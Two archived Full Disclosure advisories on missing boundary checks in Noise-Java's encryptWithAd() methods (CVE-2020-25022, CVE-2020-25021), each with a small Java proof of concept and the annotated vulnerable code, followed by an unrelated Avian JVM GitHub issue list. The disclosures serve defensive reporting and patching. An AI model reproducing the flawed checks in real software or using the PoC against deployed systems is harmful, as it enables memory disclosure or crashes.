=== Content from seclists.org_e98afaa7_20250111_003047.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](10)
[By Date](date.html#11)
[![Next](/images/right-icon-16x16.png)](13)

[![Previous](/images/left-icon-16x16.png)](10)
[By Thread](index.html#11)
[![Next](/images/right-icon-16x16.png)](13)

![](/shared/images/nst-icons.svg#search)

# Noise-Java AESGCMFallbackCipherState.encryptWithAd() insufficient boundary checks

---

*From*: Pietro Oliva via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Wed, 2 Sep 2020 07:56:22 +0000

---

```
Vulnerability title: Noise-Java AESGCMFallbackCipherState.encryptWithAd() insufficient boundary checks
Author: Pietro Oliva
CVE: CVE-2020-25022
Vendor: Rhys Weatherley (Creator of Noise Framework's reference implementation in Java)
Product: Noise-Java
Affected version: No version information is currently available.
Fixed version:    Check latest commit and pull request

Description:
The issue is located in the AESGCMFallbackCipherState.encryptWithAd() method
defined in AESGCMFallbackCipherState.java, where multiple boundary checks are
performed to prevent invalid length or offsets from being specified for the
encrypt or copy operation. However, some checks were found to be either
incomplete or missing, which would likely lead to the following scenarios:
- Out-of-bounds read or write with huge plaintextOffset, negative cipertextOffset,
  or negative length (Depending on the underlying JVM's validation).
- Exception thrown by the JVM instead of Noise-Java throwing ShortBufferException

Impact:
Further checks might be implemented in the JVM and an exception might be thrown
before attempting any operation with invalid arguments.
If that is not the case, OOB read/write or a silent return on invalid arguments
might occur. This could in turn lead to arbitrary code execution in the context
of the JVM, memory disclosure, denial of service, or data loss.

Proof of concept:
Depending on the JVM, running the following code will result in either OOB read
(see CVE-2020-17360 in Avian JVM) or exception being thrown by the JVM:

package com.southernstorm.noise.protocol;

public class poc {

    public static void main(String[] args) {
        byte[] plaintext = "This is my plaintext".getBytes();
        byte[] ciphertext = new byte[plaintext.length];
        CipherState cs = new AESGCMFallbackCipherState();

        // Passing a large plaintextOffset should result in  a ShortBufferException
        //   instead of relying on the JMV's implementation of System.arraycopy.
        try {
                cs.encryptWithAd(null, plaintext, 0x7fffffff, ciphertext, 0, 1);
        }
        catch(Exception e){
                System.out.println("An exception has been thrown: " + e);
        }

    }
}

Evidence:

public int encryptWithAd(byte[] ad, byte[] plaintext, int plaintextOffset,
        byte[] ciphertext, int ciphertextOffset, int length)
            throws ShortBufferException {
    int space;
    if (ciphertextOffset > ciphertext.length) // BUG: ciphertextOffset could be negative,
                                              // bypassing this length check
        space = 0;
    else
        space = ciphertext.length - ciphertextOffset;
        // BUG: a negative ciphertextOffset would increase the space instead of decreasing it

    if (!haskey) {
        if (length > space) // BUG: this check can be bypassed with negative ciphertextOffset
            throw new ShortBufferException();
            if (plaintext != ciphertext || plaintextOffset != ciphertextOffset)

            /* Multiple issues here:
            1. plaintextOffset is never checked. Depending on the JVM's implementation,
               This could result in OOB read in arraycopy (see CVE-2020-17360 for Avian JVM) or
               exception being thrown.
            2. ciphertextOffset could be negative, bypassing the checks on the length.
               Depending on the JVM, this could result in OOB read/write or exception being thrown.
            3. If the length is negative, depending on the JVM, arraycopy could result in OOB
               read/write, exception being thrown, or silent return (e.g. CVE-2020-17360 in Avian) */

                System.arraycopy(plaintext, plaintextOffset, ciphertext, ciphertextOffset, length);
            return length;
        }
        if (space < 16 || length > (space - 16)) // BUG: this can be bypassed with negative length
            throw new ShortBufferException();
    setup(ad);

            /* Multiple issues here as well:
            1. plaintextOffset is never checked. this could result in an exception being thrown
               by the JVM.
            2. ciphertextOffset could be negative, bypassing the checks on the length.
               Depending on the JVM, this could result in OOB write in arraycopy or exception being thrown.
            3. length could be negative. Depending on the JVM, this could result in OOB write in arraycopy
               or exception being thrown. */

    encryptCTR(plaintext, plaintextOffset, ciphertext, ciphertextOffset, length);
    ghash.update(ciphertext, ciphertextOffset, length);
    ghash.pad(ad != null ? ad.length : 0, length);
    ghash.finish(ciphertext, ciphertextOffset + length, 16);
    for (int index = 0; index < 16; ++index)
        ciphertext[ciphertextOffset + length + index] ^= hashKey[index];
    return length + 16;
}

As can be seen in the above code, multiple boundary checks are either missing
or incomplete, allowing for invalid length or offsets to be passed to the JVM's
implementation of System.arraycopy or other methods that handle encryption.
Depending on the JVM in use and how the missing/incomplete checks are exploited,
this could result in either OOB read/write, silent return, or exception thrown
by the underlying JVM. OOB read/write could result in memory/secrets disclosure,
arbitrary code execution in the context of the JVM, or crash.

Mitigating factors:
Unless the JVM has some vulnerability on its own (such as CVE-2020-17360 and
CVE-2020-17361 in Avian JVM), this vulnerability would likely result in an
unhandled exception being thrown and/or crash of the JVM process.

Remediation:
The fixes for this vulnerability can be found below:
<https://github.com/rweather/noise-java/commit/18e86b6f8bea7326934109aa9ffa705ebf4bde90>
<https://github.com/rweather/noise-java/pull/12/files>

Disclosure timeline:
28th Aug 2020  - Vulnerability reported to vendor.
29th Aug 2020  - Patch committed by vendor.
2nd Sept 2020  - Improvement for this patch provided by vulnerability reporter.
2nd Sept 2020  - Vulnerability details are made public.

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](10)
[By Date](date.html#11)
[![Next](/images/right-icon-16x16.png)](13)

[![Previous](/images/left-icon-16x16.png)](10)
[By Thread](index.html#11)
[![Next](/images/right-icon-16x16.png)](13)

### Current thread:

* **Noise-Java AESGCMFallbackCipherState.encryptWithAd() insufficient boundary checks** *Pietro Oliva via Fulldisclosure (Sep 04)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from github.com_718ef262_20250111_003049.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FReadyTalk%2Favian%2Fissues)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FReadyTalk%2Favian%2Fissues)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fissues%2Findex&source=header-repo&source_repo=ReadyTalk%2Favian)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ReadyTalk](/ReadyTalk)
/
**[avian](/ReadyTalk/avian)**
Public

* [Notifications](/login?return_to=%2FReadyTalk%2Favian) You must be signed in to change notification settings
* [Fork
  175](/login?return_to=%2FReadyTalk%2Favian)
* [Star
   1.2k](/login?return_to=%2FReadyTalk%2Favian)

* [Code](/ReadyTalk/avian)
* [Issues
  35](/ReadyTalk/avian/issues)
* [Pull requests
  3](/ReadyTalk/avian/pulls)
* [Actions](/ReadyTalk/avian/actions)
* [Projects
  0](/ReadyTalk/avian/projects)
* [Wiki](/ReadyTalk/avian/wiki)
* [Security](/ReadyTalk/avian/security)
* [Insights](/ReadyTalk/avian/pulse)

Additional navigation options

* [Code](/ReadyTalk/avian)
* [Issues](/ReadyTalk/avian/issues)
* [Pull requests](/ReadyTalk/avian/pulls)
* [Actions](/ReadyTalk/avian/actions)
* [Projects](/ReadyTalk/avian/projects)
* [Wiki](/ReadyTalk/avian/wiki)
* [Security](/ReadyTalk/avian/security)
* [Insights](/ReadyTalk/avian/pulse)

# Issues: ReadyTalk/avian

[Labels
7](/ReadyTalk/avian/labels) [Milestones
0](/ReadyTalk/avian/milestones)

[Labels
7](/ReadyTalk/avian/labels) [Milestones
0](/ReadyTalk/avian/milestones)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FReadyTalk%2Favian%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FReadyTalk%2Favian%2Fissues%2Fnew%2Fchoose)
to your account

[35 Open](/ReadyTalk/avian/issues?q=is%3Aopen+is%3Aissue)
[106 Closed](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aclosed)

[35 Open](/ReadyTalk/avian/issues?q=is%3Aopen+is%3Aissue)
[106 Closed](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aclosed)

Author

Filter by author

 Loading

author:
Filter by this user

Label

Filter by label

 Loading

Use `alt` + `click/return` to exclude labels

or `‚áß` + `click/return` for logical OR

 Projects

Filter by project

 Loading

 Milestones

Filter by milestone

 Loading

Assignee

Filter by who‚Äôs assigned

[**Assigned to nobody**](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+no%3Aassignee)

 Loading

assignee:
Filter by this user

Sort

Sort by

[Newest](/ReadyTalk/avian/issues?q=is%3Aopen+is%3Aissue)
[Oldest](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+sort%3Acreated-asc)
[Most commented](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+sort%3Acomments-desc)
[Least commented](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+sort%3Acomments-asc)
[Recently updated](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc)
[Least recently updated](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-asc)
[Best match](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+sort%3Arelevance-desc)
Most reactions
[üëç](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+sort%3Areactions-%2B1-desc)
[üëé](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+sort%3Areactions--1-desc)
[üòÑ](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+sort%3Areactions-smile-desc)
[üéâ](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+sort%3Areactions-tada-desc)
[üòï](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+sort%3Areactions-thinking_face-desc)
[‚ù§Ô∏è](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+sort%3Areactions-heart-desc)
[üöÄ](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+sort%3Areactions-rocket-desc)
[üëÄ](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+sort%3Areactions-eyes-desc)

## Issues list

[Fails to compile on a modern Linux system, fixed via PR](/ReadyTalk/avian/issues/569)
#569
opened Mar 31, 2019 by
[paulie-g](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Apaulie-g "Open issues created by paulie-g")

[File Descriptor Leak in NIO](/ReadyTalk/avian/issues/566)
#566
opened Oct 17, 2018 by
[mretallack](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Amretallack "Open issues created by mretallack")

[java/lang/annotation/AnnotationFormatError: Unexpected end of annotations.](/ReadyTalk/avian/issues/565)
#565
opened Sep 25, 2018 by
[chinacharis](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Achinacharis "Open issues created by chinacharis")

[invokedynamic leads to accessing null dynamicTable in addDynamic.](/ReadyTalk/avian/issues/564)
#564
opened Sep 7, 2018 by
[Poddster](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3APoddster "Open issues created by Poddster")

[Yet another lambda problem](/ReadyTalk/avian/issues/563)
#563
opened Jul 11, 2018 by
[teras](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Ateras "Open issues created by teras")

[Getting a ClassCastException when trying to get class annotations](/ReadyTalk/avian/issues/562)
#562
opened Jun 22, 2018 by
[amirabiri](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Aamirabiri "Open issues created by amirabiri")

[Is possible to build a GUI using Swing/JavaFX or at least AWT??](/ReadyTalk/avian/issues/558)
#558
opened Apr 3, 2018 by
[RealAquilus](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3ARealAquilus "Open issues created by RealAquilus")

[1](/ReadyTalk/avian/issues/558)

[Is it possible to embed Avian in C/C++ ?](/ReadyTalk/avian/issues/553)
#553
opened Jan 15, 2018 by
[metacritical](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Ametacritical "Open issues created by metacritical")

[1](/ReadyTalk/avian/issues/553)

[Error trying to run tomcat hello server](/ReadyTalk/avian/issues/537)
#537
opened Jun 27, 2017 by
[AntonBikineev](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3AAntonBikineev "Open issues created by AntonBikineev")

[5](/ReadyTalk/avian/issues/537)

[Simple task for embedding avian](/ReadyTalk/avian/issues/528)
#528
opened Mar 28, 2017 by
[nedtwigg](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Anedtwigg "Open issues created by nedtwigg")

[2](/ReadyTalk/avian/issues/528)

[Error: conflicting types for 'Java\_java\_lang\_Class\_forName0'](/ReadyTalk/avian/issues/519)
#519
opened Feb 2, 2017 by
[somecoolword](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Asomecoolword "Open issues created by somecoolword")

[2](/ReadyTalk/avian/issues/519)

[Build with bionic](/ReadyTalk/avian/issues/518)
#518
opened Feb 1, 2017 by
[Wetitpig](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3AWetitpig "Open issues created by Wetitpig")

[3](/ReadyTalk/avian/issues/518)

[Building with the OpenJDK class library on windows](/ReadyTalk/avian/issues/517)
#517
opened Jan 28, 2017 by
[manvir-singh](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Amanvir-singh "Open issues created by manvir-singh")

[1](/ReadyTalk/avian/issues/517)

[Compile Avian with lzma enabled](/ReadyTalk/avian/issues/507)
#507
opened Sep 30, 2016 by
[teras](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Ateras "Open issues created by teras")

[Warning issues while compiling avian in OSX](/ReadyTalk/avian/issues/503)
#503
opened Sep 22, 2016 by
[teras](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Ateras "Open issues created by teras")

[Could not get class name through JNI](/ReadyTalk/avian/issues/493)
#493
opened Jul 29, 2016 by
[ashitikov](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Aashitikov "Open issues created by ashitikov")

[1](/ReadyTalk/avian/issues/493)

[Undocumented option sim](/ReadyTalk/avian/issues/466)
#466
opened Nov 24, 2015 by
[ashitikov](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Aashitikov "Open issues created by ashitikov")

[1](/ReadyTalk/avian/issues/466)

[Protect against spurious wakeups](/ReadyTalk/avian/issues/462)
#462
opened Oct 24, 2015 by
[elfring](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Aelfring "Open issues created by elfring")

[Completion of error handling](/ReadyTalk/avian/issues/461)
#461
opened Oct 24, 2015 by
[elfring](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Aelfring "Open issues created by elfring")

[The main temporary file not delete on Lzma mode](/ReadyTalk/avian/issues/458)
#458
opened Oct 18, 2015 by
[larrylau](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Alarrylau "Open issues created by larrylau")

[3](/ReadyTalk/avian/issues/458)

[Trace test fails occasionally and unpredictably](/ReadyTalk/avian/issues/429)
[bug](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+label%3Abug)

#429
opened Apr 8, 2015 by
[dicej](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Adicej "Open issues created by dicej")

[1](/ReadyTalk/avian/issues/429)

[ConcurrentHashMap.<someCollection>.toArray() can throw ArrayIndexOutOfBoundsexception](/ReadyTalk/avian/issues/381)
[bug](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+label%3Abug)

#381
opened Dec 15, 2014 by
[jentfoo](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Ajentfoo "Open issues created by jentfoo")

[1](/ReadyTalk/avian/issues/381/linked_closing_reference?reference_location=REPO_ISSUES_INDEX)

[![@lwahlmeier](https://avatars.githubusercontent.com/u/4663016?s=40&v=4)](/ReadyTalk/avian/issues?q=assignee%3Alwahlmeier+is%3Aopen)

[openjdk(-src) ci.sh tests fail intermittently](/ReadyTalk/avian/issues/349)
#349
opened Oct 6, 2014 by
[dicej](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Adicej "Open issues created by dicej")

[ZipOutputStreamTest fails on Linux/ARM when using OpenJDK class library](/ReadyTalk/avian/issues/348)
[bug](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+label%3Abug)

#348
opened Oct 6, 2014 by
[dicej](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Adicej "Open issues created by dicej")

[Functions in unproguarded openjdk-src arm build hit pool size limits](/ReadyTalk/avian/issues/305)
[bug](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+label%3Abug)

#305
opened Jul 22, 2014 by
[joshuawarner32](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+author%3Ajoshuawarner32 "Open issues created by joshuawarner32")

Previous *1* [2](/ReadyTalk/avian/issues?page=2&q=is%3Aissue+is%3Aopen) [Next](/ReadyTalk/avian/issues?page=2&q=is%3Aissue+is%3Aopen)

Previous [Next](/ReadyTalk/avian/issues?page=2&q=is%3Aissue+is%3Aopen)

**ProTip!**
Add [no:assignee](/ReadyTalk/avian/issues?q=is%3Aissue+is%3Aopen+no%3Aassignee) to see everything that‚Äôs not assigned.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from seclists.org_40022ea0_20250111_003048.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](13)
[By Date](date.html#14)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](13)
[By Thread](index.html#14)
[![Next](/images/right-icon-16x16.png)](15)

![](/shared/images/nst-icons.svg#search)

# Noise-Java ChaChaPolyCipherState.encryptWithAd() insufficient boundary checks

---

*From*: Pietro Oliva via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Wed, 2 Sep 2020 08:00:13 +0000

---

```
Vulnerability title: Noise-Java ChaChaPolyCipherState.encryptWithAd() insufficient boundary checks
Author: Pietro Oliva
CVE: CVE-2020-25021
Vendor: Rhys Weatherley (Creator of Noise Framework's reference implementation in Java)
Product: Noise-Java
Affected version: No version information is currently available.
Fixed version:    Check latest commit and pull request

Description:
The issue is located in the ChaChaPolyCipherState.encryptWithAd() method
defined in ChaChaPolyCipherState.java, where multiple boundary checks are
performed to prevent invalid length or offsets from being specified for the
encrypt or copy operation. However, some checks were found to be either
incomplete or missing, which would likely lead to the following scenarios:
- Out-of-bounds read or write with huge plaintextOffset, negative cipertextOffset,
  or negative length (Depending on the underlying JVM's validation).
- Exception thrown by the JVM instead of Noise-Java throwing ShortBufferException

Impact:
Further checks might be implemented in the JVM and an exception might be thrown
before attempting any operation with invalid arguments.
If that is not the case, OOB read/write or a silent return on invalid arguments
might occur. This could in turn lead to arbitrary code execution in the context
of the JVM, memory disclosure, denial of service, or data loss.

Proof of concept:
Depending on the JVM, running the following code will result in either OOB read
(see CVE-2020-17360 in Avian JVM) or exception being thrown by the JVM:

package com.southernstorm.noise.protocol;

public class poc {

    public static void main(String[] args) {
        byte[] plaintext = "This is my plaintext".getBytes();
        byte[] ciphertext = new byte[plaintext.length];
        CipherState cs = new ChaChaPolyCipherState();

        // Passing a large plaintextOffset should result in a ShortBufferException
        // instead of relying on the JMV's implementation of System.arraycopy.
        try {
                cs.encryptWithAd(null, plaintext, 0x7fffffff, ciphertext, 0, 1);
        }
        catch(Exception e){
                System.out.println("An exception has been thrown: " + e);
        }

    }
}

Evidence:

public int encryptWithAd(byte[] ad, byte[] plaintext, int plaintextOffset,
        byte[] ciphertext, int ciphertextOffset, int length) throws ShortBufferException {
    int space;
    if (ciphertextOffset > ciphertext.length) // BUG: ciphertextOffset could be negative,
                                              // bypassing this length check
        space = 0;
    else
        space = ciphertext.length - ciphertextOffset;
        // BUG: a negative ciphertextOffset would increase the space instead of decreasing it

    if (!haskey) {
        if (length > space) // BUG: this check can be bypassed with negative ciphertextOffset
            throw new ShortBufferException();
        if (plaintext != ciphertext || plaintextOffset != ciphertextOffset)

            /* Multiple issues here:
            1. plaintextOffset is never checked. Depending on the JVM's implementation,
               This could result in OOB read in arraycopy (see CVE-2020-17360 for Avian JVM) or
               exception being thrown.
            2. ciphertextOffset could be negative, bypassing the checks on the length.
               Depending on the JVM, this could result in OOB read/write or exception being thrown.
            3. If the length is negative, depending on the JVM, arraycopy could result in OOB
               read/write, exception being thrown, or silent return (e.g. CVE-2020-17360 in Avian) */

            System.arraycopy(plaintext, plaintextOffset, ciphertext, ciphertextOffset, length);
        return length;
    }
    if (space < 16 || length > (space - 16))
        throw new ShortBufferException();
    setup(ad);

    /* Multiple issues here as well:
        1. plaintextOffset is never checked. this could result in an exception being thrown
           by the JVM.
        2. ciphertextOffset could be negative, bypassing the checks on the length.
           Depending on the JVM, this could result in OOB write in arraycopy or exception being thrown.
        3. length could be negative. Depending on the JVM, this could result in OOB write in arraycopy
           or exception being thrown. */

    encrypt(plaintext, plaintextOffset, ciphertext, ciphertextOffset, length);
    poly.update(ciphertext, ciphertextOffset, length);
    finish(ad, length);
    System.arraycopy(polyKey, 0, ciphertext, ciphertextOffset + length, 16);
    return length + 16;
}

As can be seen in the above code, multiple boundary checks are either missing
or incomplete, allowing for invalid length or offsets to be passed to the JVM's
implementation of System.arraycopy or other methods that handle encryption.
Depending on the JVM in use and how the missing/incomplete checks are exploited,
this could result in either OOB read/write, silent return, or exception thrown
by the underlying JVM. OOB read/write could result in memory/secrets disclosure,
arbitrary code execution in the context of the JVM, or crash.

Mitigating factors:
Unless the JVM has some vulnerability on its own (such as CVE-2020-17360 and
CVE-2020-17361 in Avian JVM), this vulnerability would likely result in an
unhandled exception being thrown and/or crash of the JVM process.

Remediation:
The fixes for this vulnerability can be found below:
<https://github.com/rweather/noise-java/commit/18e86b6f8bea7326934109aa9ffa705ebf4bde90>
<https://github.com/rweather/noise-java/pull/12/files>

Disclosure timeline:
28th Aug 2020  - Vulnerability reported to vendor.
29th Aug 2020  - Patch committed by vendor.
2nd Sept 2020  - Improvement for this patch provided by vulnerability reporter.
2nd Sept 2020  - Vulnerability details are made public.

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](13)
[By Date](date.html#14)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](13)
[By Thread](index.html#14)
[![Next](/images/right-icon-16x16.png)](15)

### Current thread:

* **Noise-Java ChaChaPolyCipherState.encryptWithAd() insufficient boundary checks** *Pietro Oliva via Fulldisclosure (Sep 04)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

